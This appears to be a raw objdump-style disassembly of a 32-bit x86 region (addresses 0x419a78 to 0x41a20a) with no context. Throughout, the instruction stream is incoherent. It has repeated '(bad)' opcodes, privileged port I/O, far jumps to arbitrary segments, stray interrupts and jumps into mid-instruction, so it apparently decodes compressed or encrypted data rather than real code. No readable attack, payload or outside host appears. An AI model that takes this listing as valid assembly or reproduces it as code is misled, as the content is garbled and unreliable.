  419a78:	outs   dx,DWORD PTR ds:[esi]
  419a79:	mov    bl,0xd0
  419a7b:	sub    BYTE PTR [edx+0x79],cl
  419a7e:	pop    esi
  419a7f:	push   edi
  419a80:	in     eax,0x9e
  419a82:	add    esp,ecx
  419a84:	xchg   ebx,eax
  419a85:	loop   0x419a12
  419a87:	jmp    0x4f9b:0xb4dd2404
  419a8e:	push   0x4
  419a90:	adc    esp,DWORD PTR [eax+ecx*1-0x1f]
  419a94:	les    edx,FWORD PTR [edi]
  419a96:	(bad)  
  419a97:	mov    edi,0x9b717aff
  419a9c:	or     ebx,DWORD PTR [ebp+0x71aba3f4]
  419aa2:	data16 sti 
  419aa4:	push   eax
  419aa5:	sub    esi,ecx
  419aa7:	aad    0xa6
  419aa9:	in     eax,dx
  419aaa:	push   esp
  419aab:	fbstp  TBYTE PTR [ebp+0x3c]
  419aae:	sbb    eax,0x14bc87f4
  419ab3:	xor    DWORD PTR [esi+0x24],ecx
  419ab6:	sub    bh,BYTE PTR [edi]
  419ab8:	daa    
  419ab9:	adc    al,0x3c
  419abb:	outs   dx,DWORD PTR ds:[esi]
  419abc:	mov    esp,0x212313f4
  419ac1:	jbe    0x419b20
  419ac3:	fcomp  QWORD PTR [eax-0x6f]
  419ac6:	push   ss
  419ac7:	mov    ebx,DWORD PTR [edx]
  419ac9:	fidivr WORD PTR es:[ebp+0x5748b33b]
  419ad0:	loope  0x419ae4
  419ad2:	je     0x419a57
  419ad4:	sti    
  419ad5:	jecxz  0x419b16
  419ad7:	jb     0x419ae1
  419ad9:	mov    bl,cl
  419adb:	adc    eax,0xcc0876d4
  419ae0:	nop
  419ae1:	in     al,dx
  419ae2:	dec    edx
  419ae3:	add    BYTE PTR [ecx],dh
  419ae5:	xchg   ebx,ebp
  419ae7:	stos   DWORD PTR es:[edi],eax
  419ae8:	(bad)  
  419ae9:	push   ebx
  419aea:	repnz push es
  419aec:	stos   DWORD PTR es:[edi],eax
  419aed:	push   ebx
  419aee:	jge    0x419af5
  419af0:	test   DWORD PTR [ebx],esi
  419af2:	cmp    eax,0x393054ce
  419af7:	inc    ecx
  419af8:	mov    ch,0xa1
  419afa:	ins    DWORD PTR es:[edi],dx
  419afb:	xchg   DWORD PTR [edx-0x2093757d],ecx
  419b01:	in     al,dx
  419b02:	pop    ebp
  419b03:	sub    DWORD PTR [eax],edx
  419b05:	add    DWORD PTR [eax+0x1e],0xb12df0cb
  419b0c:	call   0xc4dc0108
  419b11:	add    al,bh
  419b13:	je     0x419ac3
  419b15:	dec    esi
  419b16:	sub    DWORD PTR [edx+eax*2+0x656dc7e6],edx
  419b1d:	dec    ebp
  419b1e:	xchg   esp,eax
  419b1f:	cwde   
  419b20:	(bad)
  419b25:	adc    DWORD PTR [eax+0x49],0xffffffc0
  419b29:	pop    edi
  419b2a:	mov    ch,0x29
  419b2c:	cmp    BYTE PTR [edx-0x4d],dl
  419b2f:	add    edx,esp
  419b31:	mov    ecx,0xe5f542c3
  419b36:	mov    dl,0x81
  419b38:	inc    ebx
  419b39:	xchg   ebx,eax
  419b3a:	test   BYTE PTR [ebp+ebp*2+0x3b18d3e3],cl
  419b41:	mov    cl,dl
  419b43:	sub    DWORD PTR ds:0x3111f0e0,eax
  419b49:	xchg   BYTE PTR [ebx+0xf1cfbcf],al
  419b4f:	push   edx
  419b50:	adc    ch,BYTE PTR [ebx-0x41d98402]
  419b56:	or     ch,BYTE PTR [eax+0x598c0ce7]
  419b5c:	outs   dx,BYTE PTR ds:[esi]
  419b5d:	mov    ds:0x3854781d,eax
  419b62:	ja     0x419bba
  419b64:	int    0x4b
  419b66:	adc    edi,DWORD PTR [esi]
  419b68:	xor    eax,0xf034c005
  419b6d:	addr16 call 0xbab4a936
  419b73:	int3   
  419b74:	mov    al,ds:0xb3372ebe
  419b79:	fs xchg esp,eax
  419b7b:	clc    
  419b7c:	sar    BYTE PTR [ebp+esi*2-0x436665aa],1
  419b83:	pop    ebp
  419b84:	outs   dx,DWORD PTR ds:[esi]
  419b85:	daa    
  419b86:	add    al,0x66
  419b88:	add    esi,DWORD PTR [eax]
  419b8a:	mov    esi,DWORD PTR [esi+0x307b837f]
  419b90:	xchg   ebp,eax
  419b91:	jns    0x419beb
  419b93:	jno    0x419b61
  419b95:	shr    BYTE PTR [ebx+ebp*8+0x1c9500a],0xad
  419b9d:	inc    esp
  419b9e:	and    al,0x5e
  419ba0:	lea    esp,[eax-0x76]
  419ba3:	mov    eax,ds:0x8b68572e
  419ba8:	(bad)  
  419ba9:	(bad)  
  419bab:	mov    cl,BYTE PTR [edi+0x2e9f3c2]
  419bb1:	aam    0xa8
  419bb3:	or     DWORD PTR [edx+ecx*2-0x6b],ecx
  419bb7:	sahf   
  419bb8:	push   ds
  419bb9:	xchg   ebp,eax
  419bba:	inc    esp
  419bbb:	sti    
  419bbc:	jecxz  0x419c38
  419bbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bbf:	inc    esi
  419bc0:	jmp    0x419bcd
  419bc2:	cmp    eax,0x355d4905
  419bc7:	(bad)  [eax+edx*2+0x21]
  419bcb:	fisttp WORD PTR [ecx-0x34]
  419bce:	aas    
  419bcf:	retf   
  419bd0:	push   ds
  419bd1:	je     0x419b9d
  419bd3:	out    0x45,eax
  419bd5:	paddsb mm4,QWORD PTR [eax+0x7e]
  419bd9:	pusha  
  419bda:	and    eax,0x2693213f
  419bdf:	shr    edi,0x1d
  419be2:	sbb    al,0xdd
  419be4:	or     edx,DWORD PTR [ebp-0x5f]
  419be7:	xor    bl,BYTE PTR [ecx+edi*1-0x24]
  419beb:	ins    BYTE PTR es:[edi],dx
  419bec:	mov    edx,esi
  419bee:	lods   al,BYTE PTR ds:[esi]
  419bef:	adc    esp,DWORD PTR [edi]
  419bf1:	xchg   edi,eax
  419bf2:	dec    ecx
  419bf3:	js     0x419c41
  419bf5:	xchg   ebx,eax
  419bf6:	push   ecx
  419bf7:	(bad)  
  419bf8:	mul    edi
  419bfa:	mov    ebx,0xb0d8bdda
  419bff:	jo     0x419c5c
  419c01:	mov    dh,BYTE PTR [edx]
  419c03:	dec    BYTE PTR [eax]
  419c05:	mov    ecx,0xbf380883
  419c0a:	jmp    0x419b9d
  419c0c:	xchg   esp,eax
  419c0d:	cmp    ebp,DWORD PTR [ebp-0x630cfb9]
  419c13:	jne    0x419bcf
  419c15:	mov    bh,0xeb
  419c17:	aas    
  419c18:	pop    es
  419c19:	ror    ch,1
  419c1b:	dec    ebx
  419c1c:	or     eax,0xc592b68b
  419c21:	fsub   DWORD PTR [eax+0x28c6c89e]
  419c27:	fimul  DWORD PTR [esi+0x127e7e00]
  419c2d:	sbb    al,0x13
  419c2f:	aaa    
  419c30:	das    
  419c31:	cdq    
  419c32:	mov    eax,ds:0xa289145b
  419c37:	xlat   BYTE PTR ds:[ebx]
  419c38:	fldcw  WORD PTR [edx+edx*1]
  419c3b:	jmp    0x419c4c
  419c3d:	outs   dx,BYTE PTR ds:[esi]
  419c3e:	mov    ah,BYTE PTR ds:0x61b25f7f
  419c44:	fwait
  419c45:	gs jecxz 0x419cb9
  419c48:	call   0xa55c5f6b
  419c4d:	sar    eax,1
  419c4f:	mov    BYTE PTR [esi+ecx*2],bl
  419c52:	repnz and eax,0x7920ef09
  419c58:	xchg   edi,eax
  419c59:	and    BYTE PTR [edi-0xdc463ab],bh
  419c5f:	int3   
  419c60:	(bad)  
  419c61:	pop    es
  419c62:	(bad)
  419c66:	int    0x58
  419c68:	mov    ebx,ebp
  419c6a:	jns    0x419cce
  419c6c:	popa   
  419c6d:	sub    esp,DWORD PTR ds:0xacad5ba3
  419c73:	sbb    BYTE PTR [edi],dl
  419c75:	loop   0x419c82
  419c77:	xchg   ebx,eax
  419c78:	xor    BYTE PTR [edx+0x6d],bl
  419c7b:	outs   dx,DWORD PTR ds:[esi]
  419c7c:	popa   
  419c7d:	mov    al,ds:0x668ff203
  419c82:	or     ch,BYTE PTR [esp+edx*8]
  419c85:	or     ebx,DWORD PTR [eax-0x26011def]
  419c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c8c:	jne    0x419c47
  419c8e:	or     DWORD PTR [eax-0x5178c2c3],edx
  419c94:	mov    DWORD PTR [edi],esi
  419c96:	bnd jbe 0x419c48
  419c99:	(bad)  
  419c9a:	xchg   esp,eax
  419c9b:	enter  0xdc2b,0x14
  419c9f:	and    BYTE PTR [ebx-0x7f],cl
  419ca2:	mov    ch,dh
  419ca4:	xlat   BYTE PTR ds:[ebx]
  419ca5:	pop    ecx
  419ca6:	iret   
  419ca7:	sub    eax,0x85b2a8e8
  419cac:	cdq    
  419cad:	jp     0x419c6f
  419caf:	jno    0x419c83
  419cb1:	pushf  
  419cb2:	pop    edi
  419cb3:	mov    ?,WORD PTR [eax-0x39215a33]
  419cb9:	pop    ds
  419cba:	xchg   ebp,eax
  419cbb:	out    0x43,eax
  419cbd:	mov    al,0xf4
  419cbf:	and    al,0x7b
  419cc1:	xor    BYTE PTR [ebp-0x74],ah
  419cc4:	in     al,dx
  419cc5:	ins    DWORD PTR es:[edi],dx
  419cc6:	mov    edi,DWORD PTR [esi-0x1ac94515]
  419ccc:	and    ebp,DWORD PTR [esi+0x686e74e7]
  419cd2:	jb     0x419d3b
  419cd4:	shr    BYTE PTR [edi],cl
  419cd6:	fwait
  419cd7:	pop    ss
  419cd8:	dec    ecx
  419cd9:	hlt    
  419cda:	fs call 0xb2fe:0xa6a2e079
  419ce2:	mov    ds:0x7bd22236,al
  419ce7:	sbb    al,0x3d
  419ce9:	call   0xd02196ff
  419cee:	lods   eax,DWORD PTR ds:[esi]
  419cef:	sbb    DWORD PTR [eax-0x2f1586c2],esp
  419cf5:	push   edi
  419cf6:	inc    esi
  419cf7:	loop   0x419c86
  419cf9:	pushf  
  419cfa:	test   al,0x74
  419cfc:	hlt    
  419cfd:	xchg   ecx,eax
  419cfe:	push   ecx
  419cff:	sub    BYTE PTR [ebp+esi*1-0x59d73bc6],cl
  419d06:	fldl2e 
  419d08:	add    DWORD PTR [ecx-0xd5943a8],0xae42dbf1
  419d12:	xor    bh,BYTE PTR [ecx+0x7e]
  419d15:	add    esp,ebp
  419d17:	clc    
  419d18:	xchg   esp,eax
  419d19:	mov    ebx,0x1c1c85e6
  419d1e:	call   DWORD PTR [edx+0x62127e8f]
  419d24:	mov    ch,0x3c
  419d26:	sbb    BYTE PTR [edx],bh
  419d28:	enter  0x2c8c,0x58
  419d2c:	lods   eax,DWORD PTR ds:[esi]
  419d2d:	jbe    0x419d16
  419d2f:	sub    esi,esi
  419d31:	das    
  419d32:	les    ecx,FWORD PTR [edi+0x70]
  419d35:	and    edx,DWORD PTR [esi-0x4a]
  419d38:	pop    ebp
  419d39:	(bad)  
  419d3a:	jg     0x419d7a
  419d3c:	(bad)  
  419d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3e:	popa   
  419d3f:	jle    0x419d46
  419d41:	das    
  419d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d43:	out    0x15,al
  419d45:	test   bl,ah
  419d47:	mov    eax,ds:0xe9b99fcf
  419d4c:	cs cmp eax,0xc7e8d109
  419d52:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  419d54:	outs   dx,BYTE PTR ds:[esi]
  419d55:	imul   ebp,DWORD PTR [ecx-0x64],0xffffffee
  419d59:	jb     0x419d0c
  419d5b:	inc    ebx
  419d5c:	push   0xffffff98
  419d5e:	in     eax,0xb2
  419d60:	stos   DWORD PTR es:[edi],eax
  419d61:	add    eax,0xc2b34726
  419d66:	push   ebp
  419d67:	enter  0x6917,0x72
  419d6b:	fmul   st,st(4)
  419d6d:	les    ebx,FWORD PTR [ebp-0x6697cf2a]
  419d73:	repz int 0x54
  419d76:	cmp    eax,0x2ba1605d
  419d7b:	or     bl,ah
  419d7d:	sbb    ch,BYTE PTR [esi-0x1b2086e6]
  419d83:	jnp    0x419dd0
  419d85:	or     esp,edx
  419d87:	and    al,0x54
  419d89:	or     eax,0x387846fe
  419d8e:	push   0x40
  419d90:	je     0x419dde
  419d92:	xchg   ebx,eax
  419d93:	ds or  bl,ah
  419d96:	pop    ss
  419d97:	retf   0xc072
  419d9a:	sar    DWORD PTR [ebx+0x72],1
  419d9d:	push   esp
  419d9e:	pop    ds
  419d9f:	popf   
  419da0:	jmp    0x7d5a03fa
  419da5:	pushf  
  419da6:	inc    edi
  419da7:	sub    DWORD PTR [edx+esi*8],ebx
  419daa:	dec    ecx
  419dab:	mov    cl,0xb5
  419dad:	sub    BYTE PTR [esi],cl
  419daf:	out    dx,al
  419db0:	add    al,0x4b
  419db2:	imul   DWORD PTR [ebx+0x4b]
  419db5:	adc    DWORD PTR [ebx-0x59],edi
  419db8:	sar    BYTE PTR [ebp-0x3a9bb621],1
  419dbe:	daa    
  419dbf:	fbstp  TBYTE PTR [ebx]
  419dc1:	adc    BYTE PTR [ebp+0x3abb1a91],cl
  419dc7:	cmc    
  419dc8:	sub    DWORD PTR [edx+0x6f7c7eaf],edi
  419dce:	stc    
  419dcf:	leave  
  419dd0:	jmp    0xfbfe:0x59a3c526
  419dd7:	in     eax,0xba
  419dd9:	or     DWORD PTR [ebx+0x58],ecx
  419ddc:	and    ebx,DWORD PTR [ecx]
  419dde:	or     edi,DWORD PTR [ecx+0x79]
  419de1:	xlat   BYTE PTR ds:[ebx]
  419de2:	rcr    DWORD PTR [ebx-0x10],0xc6
  419de6:	mov    ah,0xf6
  419de8:	popa   
  419de9:	add    esp,ebx
  419deb:	loop   0x419d7d
  419ded:	test   eax,0xaac8cf1d
  419df2:	(bad)  
  419df3:	and    esi,DWORD PTR [eax-0x6b6b6c4f]
  419df9:	fwait
  419dfa:	in     eax,dx
  419dfb:	adc    DWORD PTR [ebp+esi*4-0x7af9f999],ebp
  419e02:	sbb    al,0x6f
  419e04:	sbb    BYTE PTR [ecx],bh
  419e06:	inc    ecx
  419e07:	jae    0x419de5
  419e09:	je     0x419e78
  419e0b:	in     al,0x3a
  419e0d:	push   ds
  419e0e:	std    
  419e0f:	sbb    BYTE PTR [esi-0x504ed6b6],cl
  419e15:	add    eax,0xb1b79219
  419e1a:	js     0x419da3
  419e1c:	adc    BYTE PTR [eax+0x42e49bef],bh
  419e22:	push   0xffffff80
  419e24:	mov    ecx,0x3ac15059
  419e29:	mov    ch,0xfb
  419e2b:	outs   dx,DWORD PTR ds:[esi]
  419e2c:	adc    bh,BYTE PTR [ecx+eiz*2-0x5e]
  419e30:	shl    DWORD PTR [esi-0x46],1
  419e33:	mov    bl,0x9
  419e35:	ins    BYTE PTR es:[edi],dx
  419e36:	or     al,0xb3
  419e38:	popa   
  419e39:	adc    edi,DWORD PTR [ebx]
  419e3b:	les    eax,FWORD PTR [ebp-0x6638fd6c]
  419e41:	pop    edx
  419e42:	dec    edx
  419e43:	(bad)  
  419e44:	push   esp
  419e45:	sub    al,0x14
  419e47:	or     ah,al
  419e49:	imul   ebx,DWORD PTR [esp+ebx*8-0x2a29e2dd],0x54646e0e
  419e54:	imul   edx,DWORD PTR [ecx-0x1af6c326],0xede2d3a1
  419e5e:	inc    ecx
  419e5f:	mov    ds:0xd075d530,al
  419e64:	push   es
  419e65:	xor    bl,bh
  419e67:	xchg   BYTE PTR ds:0x1e374ad6,ch
  419e6d:	aaa    
  419e6e:	mov    DWORD PTR [edi],ebp
  419e70:	mov    ds:0x98b612cd,al
  419e75:	jmp    0x1d5c:0x624318a9
  419e7c:	stc    
  419e7d:	mov    al,0xce
  419e7f:	mov    edx,0x6c32da57
  419e84:	mov    ebx,0xe8f0f169
  419e89:	or     BYTE PTR [esi],dh
  419e8b:	loope  0x419f08
  419e8d:	ror    DWORD PTR [ebx],cl
  419e8f:	hlt    
  419e90:	es sbb eax,0xd5685cd3
  419e96:	and    BYTE PTR [edx+0x5e],0x45
  419e9a:	jno    0x419e25
  419e9c:	and    ch,dh
  419e9e:	sub    BYTE PTR [ecx+0x15],dl
  419ea1:	aam    0x5
  419ea3:	shl    BYTE PTR [eax+0x67cc6fe0],0x89
  419eaa:	dec    esp
  419eab:	jns    0x419e71
  419ead:	outs   dx,BYTE PTR ds:[esi]
  419eae:	and    bl,bh
  419eb0:	mov    bl,0x8f
  419eb2:	scas   eax,DWORD PTR es:[edi]
  419eb3:	push   ebx
  419eb4:	cli    
  419eb5:	inc    edx
  419eb6:	jae    0x419f19
  419eb8:	mov    al,ds:0x8286681e
  419ebd:	cmp    eax,0x5f448f15
  419ec2:	or     eax,0x4a
  419ec5:	adc    BYTE PTR [eax],dh
  419ec7:	jg     0x419efd
  419ec9:	sbb    BYTE PTR [ebx+0x775ddb7e],bh
  419ecf:	out    dx,al
  419ed0:	out    0xff,al
  419ed2:	push   ecx
  419ed3:	mov    ch,0x28
  419ed5:	sbb    BYTE PTR [ebp+0x1c8b251f],0xee
  419edc:	aaa    
  419edd:	adc    DWORD PTR [ecx],esp
  419edf:	icebp  
  419ee0:	inc    edx
  419ee1:	mov    es,WORD PTR [ecx+eax*2]
  419ee4:	cdq    
  419ee5:	mov    esp,0xe208e3e0
  419eea:	mov    cl,0xe7
  419eec:	inc    esp
  419eed:	rcl    esp,1
  419eef:	mov    ecx,0x26ec7ca1
  419ef4:	daa    
  419ef5:	dec    ebx
  419ef6:	les    edx,FWORD PTR [ebx]
  419ef8:	hlt    
  419ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419efa:	sbb    al,0xe1
  419efc:	js     0x419f05
  419efe:	shr    DWORD PTR [edx],1
  419f00:	push   ds
  419f01:	nop
  419f02:	add    eax,DWORD PTR [ebp-0x419b952d]
  419f08:	mul    BYTE PTR [ecx+0x28]
  419f0b:	mov    bl,0x8f
  419f0d:	lods   eax,DWORD PTR ds:[esi]
  419f0e:	mov    al,0xd
  419f10:	sahf   
  419f11:	xlat   BYTE PTR ds:[ebx]
  419f12:	pop    ss
  419f13:	xor    al,0xc
  419f15:	leave  
  419f16:	sbb    DWORD PTR [ecx],edi
  419f18:	ror    DWORD PTR [edx-0x10bc320e],0x1a
  419f1f:	sub    ebx,ebx
  419f21:	xor    edx,edx
  419f23:	pop    esp
  419f24:	fs xchg ecx,eax
  419f26:	jns    0x419f8f
  419f28:	jge    0x419eef
  419f2a:	jp     0x419f0e
  419f2c:	cdq    
  419f2d:	out    0x9c,al
  419f2f:	inc    ecx
  419f30:	outs   dx,BYTE PTR ds:[esi]
  419f31:	ja     0x419faa
  419f33:	scas   eax,DWORD PTR es:[edi]
  419f34:	in     al,dx
  419f35:	sub    BYTE PTR [ecx+0x3c],dh
  419f38:	jp     0x419f63
  419f3a:	mov    ecx,0x5029571f
  419f3f:	dec    edi
  419f40:	test   DWORD PTR [ebp-0x62],0x158c9ff0
  419f47:	or     DWORD PTR [edx-0x4c56d09],eax
  419f4d:	stos   DWORD PTR es:[edi],eax
  419f4e:	imul   edx,DWORD PTR [edx-0x5ab9b095],0x9bc2f9fd
  419f58:	push   ebx
  419f59:	fimul  DWORD PTR [eax+0x34b5cf2f]
  419f5f:	xor    eax,0x94d7cf8f
  419f64:	jmp    0x419f6b
  419f66:	adc    DWORD PTR [ebx-0x31dc1de2],esi
  419f6c:	les    edi,FWORD PTR [ebp+0x5e576c4f]
  419f72:	mov    esp,0x6c1ba27d
  419f77:	neg    esi
  419f79:	and    eax,0x9438eea
  419f7e:	jmp    0x14f5:0x23773a9f
  419f85:	ja     0x419f50
  419f87:	push   ebp
  419f88:	retf   0x36c0
  419f8b:	inc    edi
  419f8c:	cld    
  419f8d:	pop    ebp
  419f8e:	mov    ch,0x94
  419f90:	mov    ebp,0x2850ba1e
  419f95:	inc    ebx
  419f96:	in     al,0xdd
  419f98:	int3   
  419f99:	or     bl,ah
  419f9b:	out    0x15,eax
  419f9d:	mov    esp,0x3db7ef65
  419fa2:	imul   esi,DWORD PTR [edi-0x1a],0xd344cf5f
  419fa9:	mov    bl,0x5e
  419fab:	es mov esi,0x8cd3cf44
  419fb1:	push   esp
  419fb2:	mov    ah,0x15
  419fb4:	sub    ecx,eax
  419fb6:	addr16 test bh,bl
  419fb9:	xchg   ebp,eax
  419fba:	dec    ebp
  419fbb:	sar    BYTE PTR [ebp+0x28b680ef],1
  419fc1:	sub    DWORD PTR [edi-0x6925f5c2],0x23803fff
  419fcb:	adc    DWORD PTR ds:0x21749a5,ebp
  419fd1:	add    DWORD PTR [edx],0x2f7ff66a
  419fd7:	call   0x523f92d0
  419fdc:	sar    DWORD PTR [esi],cl
  419fde:	xor    esi,DWORD PTR [eax+0x55bcb746]
  419fe4:	add    eax,0xb805465f
  419fe9:	jae    0x419fb4
  419feb:	nop
  419fec:	repz sbb dl,BYTE PTR [edi-0x3a47c369]
  419ff3:	xchg   ebp,eax
  419ff4:	out    dx,al
  419ff5:	shr    BYTE PTR [ebx+0x5532b3cf],0xfd
  419ffc:	pop    ecx
  419ffd:	jno    0x419f9e
  419fff:	pop    es
  41a000:	stc    
  41a001:	dec    ebp
  41a002:	adc    edx,esp
  41a004:	mov    BYTE PTR [ebx-0x6b],dl
  41a007:	out    0x38,al
  41a009:	cmp    dh,BYTE PTR gs:[edi]
  41a00c:	aaa    
  41a00d:	cmp    bh,BYTE PTR ds:0xca5fcc42
  41a013:	clc    
  41a014:	pop    ecx
  41a015:	mov    bh,0x86
  41a017:	or     BYTE PTR [ebx+0x18e2f859],al
  41a01d:	cdq    
  41a01e:	fnstcw WORD PTR [ecx]
  41a020:	sbb    eax,0x709f9d14
  41a025:	shl    BYTE PTR [edx+0x3a],1
  41a028:	xor    DWORD PTR [eax+0x14],eax
  41a02b:	jge    0x41a06e
  41a02d:	retf   0x5814
  41a030:	pop    es
  41a031:	mov    al,0x6d
  41a033:	push   eax
  41a034:	sbb    al,0xc1
  41a036:	jbe    0x41a03a
  41a038:	aad    0xac
  41a03a:	outs   dx,DWORD PTR ds:[esi]
  41a03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a03c:	inc    ebx
  41a03d:	jmp    0x41a020
  41a03f:	and    bh,BYTE PTR [esi-0x31]
  41a042:	push   ebx
  41a043:	mov    cs,WORD PTR [ecx-0x3f]
  41a046:	mov    edx,0x5579aea8
  41a04b:	out    0x2e,al
  41a04d:	push   es
  41a04e:	cmp    BYTE PTR [esi+ebx*4-0x7],bh
  41a052:	ins    BYTE PTR es:[edi],dx
  41a053:	loop   0x41a0ad
  41a055:	sysenter 
  41a057:	or     BYTE PTR [edi],bl
  41a059:	fs clc 
  41a05b:	mov    cl,0xb3
  41a05d:	inc    ecx
  41a05e:	xchg   edx,eax
  41a05f:	jae    0x41a01c
  41a061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a062:	xor    al,0x39
  41a064:	and    eax,0x64804e81
  41a069:	mov    dh,0x7b
  41a06b:	cmp    DWORD PTR [ecx+eiz*2],esi
  41a06e:	lods   eax,DWORD PTR ds:[esi]
  41a06f:	fnsave [eiz*8+0x5358cd28]
  41a076:	(bad)  
  41a077:	leave  
  41a078:	or     al,BYTE PTR [ebx]
  41a07a:	ins    DWORD PTR es:[edi],dx
  41a07b:	popa   
  41a07c:	int    0x2c
  41a07e:	dec    ebx
  41a07f:	mov    ch,0xa3
  41a081:	jge    0x41a08b
  41a083:	idiv   ah
  41a085:	xor    BYTE PTR [esi+0x5a],al
  41a088:	xor    esi,esi
  41a08a:	jmp    0x259a:0x8b5d74c7
  41a091:	jmp    0x3062:0xa8c7b337
  41a098:	inc    esi
  41a099:	cdq    
  41a09a:	in     al,dx
  41a09b:	es pushf 
  41a09d:	xchg   ecx,eax
  41a09e:	mov    cl,0x67
  41a0a0:	jo     0x41a0ea
  41a0a2:	iret   
  41a0a3:	aas    
  41a0a4:	sti    
  41a0a5:	aam    0x2
  41a0a7:	inc    ecx
  41a0a8:	(bad)  
  41a0a9:	mov    bl,0x3d
  41a0ab:	arpl   ax,cx
  41a0ad:	cmp    ebx,DWORD PTR [esi]
  41a0af:	adc    BYTE PTR [edi+0x1e4a86a1],bl
  41a0b5:	pop    esp
  41a0b6:	lods   al,BYTE PTR ds:[esi]
  41a0b7:	xor    BYTE PTR [eax-0x7f],ch
  41a0ba:	cs jnp 0x41a0a9
  41a0bd:	pop    esp
  41a0be:	(bad)  
  41a0bf:	jge    0x41a125
  41a0c1:	mov    ah,0x7a
  41a0c3:	xchg   edi,eax
  41a0c4:	push   eax
  41a0c5:	mov    bl,0xfb
  41a0c7:	add    ah,BYTE PTR [edx+0x319ca56c]
  41a0cd:	jbe    0x41a065
  41a0cf:	push   edx
  41a0d0:	dec    edx
  41a0d1:	cmp    al,0x36
  41a0d3:	adc    ecx,ebx
  41a0d5:	sub    ah,BYTE PTR [esi-0x6ae84255]
  41a0db:	inc    esp
  41a0dc:	inc    edi
  41a0dd:	dec    esi
  41a0de:	pop    es
  41a0df:	popf   
  41a0e0:	in     al,dx
  41a0e1:	sar    DWORD PTR [edx+ebp*2],1
  41a0e4:	mov    DWORD PTR [ebp-0xed86984],0xcf02706e
  41a0ee:	fidivr WORD PTR [esi-0x7d43482f]
  41a0f4:	add    dl,BYTE PTR [ebx]
  41a0f6:	fld    QWORD PTR [esi+0x21b40781]
  41a0fc:	jg     0x41a128
  41a0fe:	adc    al,0xcc
  41a100:	gs dec edi
  41a102:	scas   al,BYTE PTR es:[edi]
  41a103:	push   ecx
  41a104:	inc    edx
  41a105:	or     al,BYTE PTR [ecx]
  41a107:	add    dl,BYTE PTR [edx]
  41a109:	pop    ds
  41a10a:	nop
  41a10b:	mov    ch,0x4f
  41a10d:	js     0x41a153
  41a10f:	and    bl,BYTE PTR [edx]
  41a111:	xor    esp,DWORD PTR [edx-0x73daf01a]
  41a117:	(bad)  
  41a119:	or     al,0xe8
  41a11b:	(bad)  
  41a11c:	shr    ebx,1
  41a11e:	cli    
  41a11f:	cmp    BYTE PTR [esi+0x1f],cl
  41a122:	mov    ebp,0x870d06b6
  41a127:	adc    al,0xff
  41a129:	adc    esp,DWORD PTR [ecx+0x7b]
  41a12c:	ret    
  41a12d:	jle    0x41a12d
  41a12f:	inc    esi
  41a130:	je     0x41a0c4
  41a132:	mov    fs,edx
  41a134:	jnp    0x41a103
  41a136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a137:	lods   al,BYTE PTR ds:[esi]
  41a138:	rol    bh,1
  41a13a:	iret   
  41a13b:	mov    ebp,0x86e97c64
  41a140:	fcomp  QWORD PTR [ecx]
  41a142:	test   eax,0x13b9a58
  41a147:	or     esi,DWORD PTR [edx+0x61]
  41a14a:	mov    al,ds:0xe229d4b0
  41a14f:	lds    ebp,FWORD PTR [eax]
  41a151:	mov    esi,0x3220f8b3
  41a156:	xlat   BYTE PTR ds:[ebx]
  41a157:	sbb    eax,edi
  41a159:	xchg   cl,ah
  41a15b:	cs cwde 
  41a15d:	jg     0x41a184
  41a15f:	mov    WORD PTR [ecx+edx*2+0x44],?
  41a163:	jne    0x41a119
  41a165:	in     al,dx
  41a166:	push   edi
  41a167:	ror    DWORD PTR [edi+0x72],cl
  41a16a:	xchg   edx,eax
  41a16b:	lods   eax,DWORD PTR ds:[esi]
  41a16c:	add    ah,BYTE PTR [eax+0x3842f0ee]
  41a172:	adc    ah,bh
  41a174:	or     eax,eax
  41a176:	jnp    0x41a1d4
  41a178:	push   0x560318a7
  41a17d:	or     eax,0xb580df8c
  41a182:	test   al,0x90
  41a184:	das    
  41a185:	inc    edi
  41a186:	mov    al,BYTE PTR ds:0xfc6163d0
  41a18c:	sub    DWORD PTR [edx+0x287f4a6e],ebx
  41a192:	inc    edi
  41a193:	int    0x8c
  41a195:	jl     0x41a1d0
  41a197:	mov    edi,0x4dac620d
  41a19c:	pop    edi
  41a19d:	fidiv  WORD PTR [ecx+edi*4+0x1777687d]
  41a1a4:	mov    dl,0x19
  41a1a6:	push   es
  41a1a7:	or     ecx,edx
  41a1a9:	push   eax
  41a1aa:	cmp    DWORD PTR [ecx-0x58ab2d7],esi
  41a1b0:	into   
  41a1b1:	cmp    edx,DWORD PTR [ebp+0x3b]
  41a1b4:	loop   0x41a1f7
  41a1b6:	sub    al,BYTE PTR [edi+0x79ee8a82]
  41a1bc:	dec    ecx
  41a1bd:	in     al,0x35
  41a1bf:	adc    DWORD PTR [ebx+0x3],0xb8a75fa5
  41a1c6:	(bad)  [ebx+edi*4-0x13]
  41a1ca:	mov    cl,0x13
  41a1cc:	out    0x3d,eax
  41a1ce:	jnp    0x41a239
  41a1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d1:	ins    BYTE PTR es:[edi],dx
  41a1d2:	(bad)  
  41a1d3:	or     cl,ch
  41a1d5:	push   ss
  41a1d6:	jne    0x41a197
  41a1d8:	xor    ch,cl
  41a1da:	adc    BYTE PTR [eax],0x47
  41a1dd:	fldenv [esi+0x3341fed8]
  41a1e3:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a1e5:	sub    DWORD PTR [edx+0x7867b9c1],edx
  41a1eb:	sti    
  41a1ec:	stos   BYTE PTR es:[edi],al
  41a1ed:	neg    BYTE PTR [ecx+0x7506c3f0]
  41a1f3:	pop    esi
  41a1f4:	shl    cl,cl
  41a1f6:	dec    edx
  41a1f7:	sub    cl,BYTE PTR [ebx-0x54]
  41a1fa:	or     ebp,esi
  41a1fc:	push   edx
  41a1fd:	rcr    BYTE PTR [esi],1
  41a1ff:	ficomp WORD PTR [eax]
  41a201:	cwde   
  41a202:	pop    ss
  41a203:	scas   al,BYTE PTR es:[edi]
  41a204:	xor    bl,BYTE PTR ds:0x1a2549d5
  41a20a:	mov    BYTE PTR [esi],cl
